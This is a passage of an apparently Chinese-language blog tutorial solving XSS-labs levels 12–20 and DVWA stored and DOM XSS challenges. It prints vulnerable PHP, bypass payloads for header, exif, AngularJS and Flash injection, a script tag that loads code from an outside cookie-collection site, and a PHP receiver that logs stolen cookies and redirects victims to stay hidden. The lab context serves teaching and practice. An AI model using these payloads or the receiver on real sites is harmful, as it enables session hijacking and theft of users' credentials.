class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//不再是REFERER请求头，现在更换了User-agent</span></span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$str = $_GET[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\">$str00 = $_GET[<span class=\"string\">&quot;t_sort&quot;</span>];</span><br><span class=\"line\">$str11=$_SERVER[<span class=\"string\">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class=\"line\">$str22=str_replace(<span class=\"string\">&quot;&gt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str11);</span><br><span class=\"line\">$str33=str_replace(<span class=\"string\">&quot;&lt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,$str22);</span><br><span class=\"line\">echo <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form id=search&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class=\"string\">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改User-agent插入PoC</span><br><span class=\"line\">`User-Agent: &quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`User-Agent: &quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828162042253.png\" alt=\"image-20200828162042253\"></p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828162112961.png\" alt=\"image-20200828162112961\"></p>\n<h5 id=\"挑战十三\"><a href=\"#挑战十三\" class=\"headerlink\" title=\"挑战十三\"></a>挑战十三</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;修改请求头Cookie来测试</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class=\"line\">$str00 &#x3D; $_GET[&quot;t_sort&quot;];</span><br><span class=\"line\">$str11&#x3D;$_COOKIE[&quot;user&quot;];</span><br><span class=\"line\">$str22&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class=\"line\">$str33&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class=\"line\">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class=\"line\">&lt;form id&#x3D;search&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#39;.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#39;.htmlspecialchars($str00).&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;input name&#x3D;&quot;t_cook&quot;  value&#x3D;&quot;&#39;.$str33.&#39;&quot; type&#x3D;&quot;hidden&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;center&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改Cookie</span><br><span class=\"line\">`Cookie: user=call+me+maybe%3F&quot; onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`Cookie: user=call+me+maybe%3F&quot; onclick=&quot;alert(1) type=&quot;text&quot;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200828162907084.png\" alt=\"image-20200828162907084\"></p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828162927276.png\" alt=\"image-20200828162927276\"></p>\n<h5 id=\"挑战十四\"><a href=\"#挑战十四\" class=\"headerlink\" title=\"挑战十四\"></a>挑战十四</h5><p>网路搜索：</p>\n<p><code>此题主要利用exif xss，链接由于网络的原因无法访问，exif xss，一般利用于文件上传的地方，最经典的就是头像上传，上传一个图片，该图片的exif元数据被修改为xss payload，成功利用弹窗，可利用exiftool工具，命令如下：</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//但是因为域名无法访问了，这题后期再更</span><br><span class=\"line\">`exiftool -FIELD=XSS FILENAME`</span><br><span class=\"line\">`exiftool -Artist=&#x27; &quot;&gt;&lt;img src=1 onerror=alert(document.domain)&gt;&#x27; filename.jpeg`</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"挑战十五\"><a href=\"#挑战十五\" class=\"headerlink\" title=\"挑战十五\"></a>挑战十五</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;ng-include是AngularJS中指令，具有文件包含功能&quot;&lt;div ng-include&#x3D;&quot;&#39;myFile.htm&#39;&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\">&quot;，和php中include函数类似。可通过src属性来加载以上是挑战任意一个。</span><br><span class=\"line\">&#x2F;&#x2F;这里需要注意，其中远程加载google的js，需要&quot;扶梯子&quot;才行。</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; $_GET[&quot;src&quot;];</span><br><span class=\"line\">echo &#39;&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//这里包含挑战二来实现XSS</span><br><span class=\"line\">`/level15.php?src=&#x27;level2.php?keyword=&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&#x27;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828200852458.png\" alt=\"image-20200828200852458\"></p>\n<h5 id=\"挑战十六\"><a href=\"#挑战十六\" class=\"headerlink\" title=\"挑战十六\"></a>挑战十六</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;对变量的值进行script、&#x2F;、空格等替换&amp;nbsp，用%0d，%0a等绕过</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class=\"line\">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class=\"line\">$str3&#x3D;str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class=\"line\">$str4&#x3D;str_replace(&quot;&#x2F;&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class=\"line\">$str5&#x3D;str_replace(&quot;\t&quot;,&quot;&amp;nbsp;&quot;,$str4);</span><br><span class=\"line\">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;&#x2F;center&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;center&gt;&lt;img src&#x3D;level16.png&gt;&lt;&#x2F;center&gt;</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//对字符进行编码</span><br><span class=\"line\">`&lt;img%0dsrc=1%0donerror=alert(16)&gt;`</span><br><span class=\"line\">`&lt;iframe%0dsrc=0%0donmouseover=alert｀16｀&gt;&lt;/iframe&gt;`</span><br><span class=\"line\">`&lt;svg%0aonload=alert｀16｀&gt;&lt;/svg&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828203522683.png\" alt=\"image-20200828203522683\"></p>\n<h5 id=\"挑战十七\"><a href=\"#挑战十七\" class=\"headerlink\" title=\"挑战十七\"></a>挑战十七</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;加载swf文件，并对两个参数arg01和arg02值进行过滤</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &quot;&lt;embed src&#x3D;xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width&#x3D;100% heigth&#x3D;100%&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用编码%0a、%0b绕过。</span><br><span class=\"line\">`arg01=123&amp;arg02= onmouseover=alert(1)`</span><br><span class=\"line\">`arg01=123&amp;arg02=%20onmousedown=alert`1``</span><br><span class=\"line\">`arg01=123&amp;arg02=  onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">``/level17.php?arg01=a&amp;arg02=%20onmouseover=alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200828220707491.png\" alt=\"image-20200828220707491\"></p>\n<h5 id=\"挑战十八\"><a href=\"#挑战十八\" class=\"headerlink\" title=\"挑战十八\"></a>挑战十八</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;和挑战十七的试题一致，可直接拿来利用测试</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &quot;&lt;embed src&#x3D;xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width&#x3D;100% heigth&#x3D;100%&gt;&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用编码%0a、%0b绕过。</span><br><span class=\"line\">`arg01=123&amp;arg02= onmouseover=alert(1)`</span><br><span class=\"line\">`arg01=123&amp;arg02=%20onmousedown=alert`1``</span><br><span class=\"line\">`arg01=123&amp;arg02=  onmouseover=alert(1) type=&quot;text&quot;`</span><br><span class=\"line\">`/level17.php?arg01=a&amp;arg02=%20onmouseover=alert`1``</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200829095926257.png\" alt=\"image-20200829095926257\"></p>\n<h5 id=\"挑战十九\"><a href=\"#挑战十九\" class=\"headerlink\" title=\"挑战十九\"></a>挑战十九</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;此题主要介绍考察Flash XSS</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &#39;&lt;embed src&#x3D;&quot;xsf03.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width&#x3D;100% heigth&#x3D;100%&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>直接访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;xss-lab.me:8888&#x2F;level19.php?arg01&#x3D;a&amp;arg02&#x3D;b</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200829104903728.png\" alt=\"image-20200829104903728\"></p>\n<p>swf文件直接输出参数值</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用a标签加载javascript协议弹窗</span><br><span class=\"line\">`/level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;XSS_Click&lt;/a&gt;`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200829105426617.png\" alt=\"image-20200829105426617\"></p>\n<p>点击触发漏洞</p>\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200829105522767.png\" alt=\"image-20200829105522767\"></p>\n<h5 id=\"挑战二十\"><a href=\"#挑战二十\" class=\"headerlink\" title=\"挑战二十\"></a>挑战二十</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;网络搜索未找到对应解析此题，只知道此题还是Flash XSS。</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">ini_set(&quot;display_errors&quot;, 0);</span><br><span class=\"line\">echo &#39;&lt;embed src&#x3D;&quot;xsf04.swf?&#39;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;&#x3D;&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&#39;&quot; width&#x3D;100% heigth&#x3D;100%&gt;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><code>payload</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//使用以下payload可实现，备注参数arg01的值必须是id不然都不弹窗；不理解其意；</span><br><span class=\"line\">`level20.php?arg01=id&amp;arg02=\\&quot;))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(document.cookie)//%26width%26height`</span><br></pre></td></tr></table></figure>\n\n<p><code>Result</code></p>\n<p><img src=\"/images/XSS/image-20200829135137358.png\" alt=\"image-20200829135137358\"></p>\n<p>参考以上学习可简单了解XSS反射型，但如想继续研究建议可网络搜索在线挑战并练习或参考网上Writeup。</p>\n<h4 id=\"存储型-1\"><a href=\"#存储型-1\" class=\"headerlink\" title=\"存储型\"></a>存储型</h4><p>存储型XSS  是指应用程序通过Web请求获取不可信赖的数据，在未检验数据是否存在XSS代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行XSS代码，存储型XSS可以持续攻击用户。存储型XSS漏洞大多出现在留言板、评论区，用户提交了包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行，存储型XSS就发生了。</p>\n<p>存储型XSS攻击方式主要是嵌入一段远程或者第三方域上的JS代码，并在目标域执行这些代码。存储型XSS会造成Cookie泄露，破坏页面正常的结构与样式，重定向访问恶意网站等。</p>\n<h5 id=\"搭建接收平台\"><a href=\"#搭建接收平台\" class=\"headerlink\" title=\"搭建接收平台\"></a>搭建接收平台</h5><p>参考下面的<code>cookie.php</code>文件获取网站cookie方式；保存单文件至当前文件夹内；也可以使用互联网上的接收平台<a href=\"https://webxss.top/\">XSS_Top</a></p>\n<h5 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h5><h6 id=\"DVWA-low\"><a href=\"#DVWA-low\" class=\"headerlink\" title=\"DVWA-low\"></a>DVWA-low</h6><p>看到输入框长度有限制，这里可以通过修改JS，或者使用Burpsuite来实现。</p>\n<p><img src=\"/images/XSS/image-20200831171126727.png\" alt=\"image-20200831171126727\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DVWA-Low</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; Get input</span><br><span class=\"line\">\t$message &#x3D; trim( $_POST[ &#39;mtxMessage&#39; ] );</span><br><span class=\"line\">\t$name    &#x3D; trim( $_POST[ &#39;txtName&#39; ] );</span><br><span class=\"line\">\t&#x2F;&#x2F; Sanitize message input</span><br><span class=\"line\">\t$message &#x3D; stripslashes( $message );</span><br><span class=\"line\">\t$message &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Sanitize name input</span><br><span class=\"line\">\t$name &#x3D; ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; Update database</span><br><span class=\"line\">\t$query  &#x3D; &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;</span><br><span class=\"line\">\t$result &#x3D; mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res &#x3D; mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;&#x2F;pre&gt;&#39; );</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;mysql_close();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>截获数据并修改Message的值</p>\n<p><img src=\"/images/XSS/image-20200831171424381.png\" alt=\"image-20200831171424381\"></p>\n<p>接收平台此时会收到Cookie值</p>\n<p><img src=\"/images/XSS/image-20200831171401476.png\" alt=\"image-20200831171401476\"></p>\n<p>浏览器插件添加Cookie值并绕过登录</p>\n<p><img src=\"/images/XSS/image-20200831173056272.png\" alt=\"image-20200831173056272\"></p>\n<p>接收Cookie的php文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$cookie &#x3D; $_GET[&#39;cookie&#39;]; &#x2F;&#x2F;以GET方式获取cookie变量值</span><br><span class=\"line\">$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;); &#x2F;&#x2F;远程主机IP地址</span><br><span class=\"line\">$time&#x3D;date(&#39;Y-m-d g:i:s&#39;); &#x2F;&#x2F;以“年-月-日 时：分：秒”的格式显示时间</span><br><span class=\"line\">$referer&#x3D;getenv (&#39;HTTP_REFERER&#39;); &#x2F;&#x2F;链接来源</span><br><span class=\"line\">$agent &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;]; &#x2F;&#x2F;用户浏览器类型</span><br><span class=\"line\"></span><br><span class=\"line\">$fp &#x3D; fopen(&#39;cookie.txt&#39;, &#39;a&#39;); &#x2F;&#x2F;打开cookie.txt，若不存在则创建它</span><br><span class=\"line\">fwrite($fp,&quot; IP: &quot; .$ip. &quot;\\n Date and Time: &quot; .$time. &quot;\\n User Agent:&quot;.$agent.&quot;\\n Referer: &quot;.$referer.&quot;\\n Cookie: &quot;.$cookie.&quot;\\n\\n\\n&quot;); &#x2F;&#x2F;写入文件</span><br><span class=\"line\">fclose($fp); &#x2F;&#x2F;关闭文件</span><br><span class=\"line\"></span><br><span class=\"line\">header(&quot;Location: http:&#x2F;&#x2F;www.baidu.com&quot;)&#x2F;&#x2F;重定向到baidu，防止发现</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>直接访问生成cookie.txt文件</p>\n<p><img src=\"/images/XSS/image-20200831183628978.png\" alt=\"image-20200831183628978\"></p>\n<h6 id=\"DVWA-Medium\"><a href=\"#DVWA-Medium\" class=\"headerlink\" title=\"DVWA-Medium\"></a>DVWA-Medium</h6><p>中级和低级比较显示使用部分函数进行过滤。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addslashes()\t\t\t\t使用反斜线引用字符串</span><br><span class=\"line\">htmlspecialchars()\t将特殊字符转换为 HTML 实体</span><br><span class=\"line\">str_replace()\t\t\t\t子字符串替换</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901112252053.png\" alt=\"image-20200901112252053\"></p>\n<p>抓包绕过</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt;`</span><br><span class=\"line\">大小写绕过</span><br><span class=\"line\">`&lt;Script&gt;alert(/xss/)&lt;/script&gt;`</span><br><span class=\"line\">`&lt;/textarea&gt;&#x27;&quot;&gt;&lt;Script src=https://webxss.top/xss/BjE4XZ?1598931992&gt;&lt;/script&gt;`</span><br></pre></td></tr></table></figure>\n\n<p>弹窗检测</p>\n<p><img src=\"/images/XSS/image-20200901134156567.png\" alt=\"image-20200901134156567\"></p>\n<p><img src=\"/images/XSS/image-20200901134205736.png\" alt=\"image-20200901134205736\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;img src=1 οnerrοr=alert(1)&gt;`</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"DVWA-high\"><a href=\"#DVWA-high\" class=\"headerlink\" title=\"DVWA-high\"></a>DVWA-high</h6><p>高和中比较发现采用正则表达式对script进行过滤了；但可尝试使用其他标签<img>等</p>\n<p><img src=\"/images/XSS/image-20200901135011353.png\" alt=\"image-20200901135011353\"></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert(1)</span>&gt;</span>`</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901140548264.png\" alt=\"image-20200901140548264\"></p>\n<p><img src=\"/images/XSS/image-20200901140610422.png\" alt=\"image-20200901140610422\"></p>\n<h4 id=\"DOM型-2\"><a href=\"#DOM型-2\" class=\"headerlink\" title=\"DOM型\"></a>DOM型</h4><h5 id=\"DVWA-low-1\"><a href=\"#DVWA-low-1\" class=\"headerlink\" title=\"DVWA-low\"></a>DVWA-low</h5><p>low版本不存在任何显示，default参数值设置为payload。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"># No protections, anything goes</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/XSS/image-20200901142115894.png\" alt=\"image-20200901142115894\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span 